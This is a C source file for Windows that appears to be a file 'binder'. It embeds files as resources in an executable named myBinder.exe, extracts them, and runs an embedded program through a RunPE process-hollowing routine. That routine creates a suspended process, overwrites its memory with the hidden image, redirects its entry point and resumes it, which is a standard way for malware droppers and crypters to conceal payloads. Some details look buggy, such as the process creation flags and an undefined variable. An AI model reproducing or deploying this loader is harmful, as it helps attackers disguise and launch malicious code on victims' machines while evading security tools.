#include "run.h"

void Extract(int id, char *filename)
{
    HGLOBAL hResourceLoaded;		// handle to loaded resource
    HRSRC hRes;						// handle/ptr. to res. info.
    char *lpResLock;				// pointer to resource data
    DWORD dwSizeRes;
    FILE *output = fopen(filename, "wb+");

    // find location of the resource and get handle to it
    hRes = FindResource( NULL, MAKEINTRESOURCE(id), RT_RCDATA );

    // loads the specified resource into global memory.
    hResourceLoaded = LoadResource( NULL, hRes );

    // get a pointer to the loaded resource!
    lpResLock = (char*)LockResource( hResourceLoaded );

    // determine the size of the resource, so we know how much to write out to file!
    dwSizeRes = SizeofResource( NULL, hRes );
    printf("%d\n", dwSizeRes);

    fwrite(lpResLock, 1, dwSizeRes, output);

    fclose(output);
}

void Run(int id, char *path)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    void    *pvRes;
    DWORD dwSize;
    char* lpMemory;
    HMODULE hModule = GetModuleHandle(NULL);
    if ((hResInfo = FindResource(hModule, MAKEINTRESOURCE(id), RT_RCDATA)) != NULL)
    {
        if ((hResData = LoadResource(hModule, hResInfo)) != NULL)
        {
            if ((pvRes = LockResource(hResData)) != NULL)
            {
                dwSize = SizeofResource(hModule, hResInfo);
                if(dwSize == 0){
                        puts("no data");
                    return;
                } else {
                    //printf("%d", dwSize);
                }
                lpMemory = (char*)malloc (dwSize);
                memset(lpMemory,0,dwSize);
                memcpy (lpMemory, pvRes, dwSize);
                RunFromMemory(lpMemory,path);
            }
        }
    }
}

void RunFromMemory(char* pImage,char* pPath)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0;
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;

    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[1000];

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFO peStartUpInformation;
    CONTEXT pContext;

    char* pMemory;
    char* pFile;
    memcpy(&IDH,pImage,sizeof(IDH));
    memcpy(&INH,(void*)((DWORD)pImage+IDH.e_lfanew),sizeof(INH));

    dwImageSize = INH.OptionalHeader.SizeOfImage;
    pMemory = (char*)malloc(dwImageSize);
    memset(pMemory,0,dwImageSize);
    pFile = pMemory;

    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = (DWORD)(((DWORD)pImage+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);

    memcpy(pFile,pImage,dwHeader);

    if((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment)==0)
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }

    pFile = (char*)((DWORD)pFile + jmpSize);

    for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        memcpy(pFile,(char*)(pImage + Sections[dwSectionCount].PointerToRawData),dwSectionSize);

        if((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment)==0)
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        }
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }


    memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
    memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));
    memset(&pContext,0,sizeof(CONTEXT));

    peStartUpInformation.cb = sizeof(peStartUpInformation);
    if(CreateProcess(NULL,pPath,&secAttrib,NULL,FALSE,CREATE_NEW_CONSOLE&CREATE_SUSPENDED,NULL,NULL,&peStartUpInformation,&peProcessInformation))
    {
        pContext.ContextFlags = CONTEXT_FULL;
        GetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,PAGE_EXECUTE_READWRITE,&previousProtection);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
        ResumeThread(peProcessInformation.hThread);
    }
    free(pMemory);
}

void Update(int id, char *name)
{
    FILE *file = fopen(name, "rb+");
    int size = 0;
    int tmp;
    char *buf = malloc(100000);
    while(1) {
        tmp =fgetc(file);
        if(tmp == EOF){
            break;
        }
        buf[size++] = tmp;
    //printf("%d\n", size);
    }
    printf("%d\n", size);
    fclose(file);
    HANDLE hUpdateRes;  // update resource handle
    BOOL result;

// Open the file to which you want to add the dialog box resource.
    hUpdateRes = BeginUpdateResource("main/myBinder.exe", FALSE);
    if (hUpdateRes == NULL)
    {
        puts("Could not open file for writing.");
        return;
    }

// Add the dialog box resource to the update list.
    result = UpdateResource(hUpdateRes,    // update resource handle
                            RT_RCDATA,                         // change dialog box resource
                            MAKEINTRESOURCE(id),         // dialog box id
                            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),  // neutral language
                            buf,                         // ptr to resource info
                            size);       // size of resource info
free(buf);
    if (result == FALSE)
    {
        puts("Could not add resource.");
        return;
    }

// Write changes to FOOT.EXE and then close it.
    if (!EndUpdateResource(hUpdateRes, FALSE))
    {
        puts("Could not write changes to file.");
        return;
    }
}
